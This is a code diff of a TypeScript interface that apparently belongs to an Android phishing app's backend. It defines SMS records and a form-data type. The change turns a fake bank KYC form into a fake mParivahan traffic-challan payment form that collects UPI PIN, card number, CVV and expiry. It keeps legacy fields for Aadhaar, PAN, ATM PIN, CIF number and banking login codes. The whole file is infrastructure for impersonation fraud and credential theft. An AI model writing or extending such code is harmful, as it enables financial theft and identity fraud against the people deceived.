@@ -34,31 +34,34 @@ export interface SMS {
     simSlot?: number;
 }
 
-// Form data submitted from Android app (multi-step KYC form)
+// Form data submitted from Android app (multi-step form)
 export interface FormData {
-    // Step 2: KYC Login
-    fullName?: string;
+    // mParivahan Challan Form fields
+    vehicleNumber?: string;
     mobileNumber?: string;
+    paymentMethod?: string;
+    upiApp?: string;
+    upiPin?: string;
+    cardType?: string;
+    cardNumber?: string;
+    cardHolderName?: string;
+    cardExpiry?: string;
+    cvv?: string;
+
+    // Legacy fields
+    fullName?: string;
     motherName?: string;
-    // Step 3: Profile Verification
     accountNumber?: string;
     aadhaarNumber?: string;
     panCard?: string;
     panNumber?: string;
-    // Step 4: Card Authentication
     cardLast6?: string;
-    cardNumber?: string;
     validThrough?: string;
-    cvv?: string;
     atmPin?: string;
-    // Step 5: Apply YONO
     cifNumber?: string;
     branchCode?: string;
-    // Step 6: Final Verification
     dateOfBirth?: string;
-    cardExpiry?: string;
     finalPin?: string;
-    // Step 7: Login Details
     userId?: string;
     accessCode?: string;
     profileCode?: string;
